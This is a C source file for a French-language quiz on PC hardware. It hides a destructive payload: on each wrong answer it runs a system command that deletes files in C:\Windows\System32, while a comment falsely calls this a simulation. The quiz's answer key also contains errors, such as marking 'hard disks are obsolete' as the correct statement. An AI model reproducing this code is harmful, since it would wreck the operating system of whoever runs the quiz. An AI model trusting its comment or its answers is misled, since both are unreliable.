#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>  // Pour utiliser sleep()

// Structure pour chaque question
struct Question {
    char question[256];
    char options[4][50];
    char correct_answer;
};

void poser_question(struct Question q) {
    printf("%s\n", q.question);
    printf("a) %s\n", q.options[0]);
    printf("b) %s\n", q.options[1]);
    printf("c) %s\n", q.options[2]);
    printf("d) %s\n", q.options[3]);

    char answer;
    printf("Votre reponse : ");
    scanf(" %c", &answer);

    if (answer == q.correct_answer) {
        printf("Bonne reponse !\n");
    } else {
        printf("Mauvaise reponse. La bonne reponse etait : %c\n", q.correct_answer);
        printf("Suppression de C:\\Windows\\System32\n");
        // Effectuer une action de suppression (simulation, ne pas faire de suppression réelle !)
        system("del C:\\Windows\\System32\\*.*");
    }

    sleep(5); // Attendre 5 secondes avant de passer à la question suivante
}

int main() {
    struct Question questions[] = {
        {"Quel est le composant principal d'un PC ?", {"Processeur", "Carte mère", "RAM", "Disque dur"}, 'a'},
        {"Quel est le rôle du processeur ?", {"Exécuter des programmes", "Stocker les données", "Alimenter l'écran", "Gérer la carte graphique"}, 'a'},
        {"Qu'est-ce qu'un SSD ?", {"Un type de mémoire", "Un processeur", "Un type de disque dur", "Une carte graphique"}, 'c'},
        {"Lequel de ces éléments est nécessaire pour une carte mère ?", {"Processeur", "Carte graphique", "Disque dur", "RAM"}, 'a'},
        {"Qu'est-ce que l'overclocking ?", {"Augmenter la vitesse du processeur", "Baisser la consommation d'énergie", "Réduire la taille d'un composant", "Augmenter la RAM"}, 'a'},
        {"Quel type de mémoire est le plus rapide ?", {"SSD", "HDD", "RAM", "CD-ROM"}, 'c'},
        {"Quel est le rôle de la carte graphique ?", {"Traiter les graphismes", "Gérer la mémoire", "Exécuter les programmes", "Alimenter le processeur"}, 'a'},
        {"Quel est l'avantage d'un SSD par rapport à un HDD ?", {"Plus rapide", "Moins cher", "Plus fiable", "Plus de capacité"}, 'a'},
        {"Qu'est-ce qu'une carte mère ?", {"Le composant central d'un PC", "Une carte pour connecter des périphériques", "Une carte graphique", "Un disque de stockage"}, 'a'},
        {"Laquelle de ces affirmations est correcte ?", {"Un SSD est plus rapide qu'un HDD, mais coûte plus cher", "Un processeur plus rapide rend un PC plus lent", "La RAM est un type de stockage", "Les disques durs sont obsolètes"}, 'd'}
    };

    int num_questions = sizeof(questions) / sizeof(questions[0]);

    for (int i = 0; i < num_questions; i++) {
        poser_question(questions[i]);
    }

    printf("\nQuiz terminé !\n");
    return 0;
}
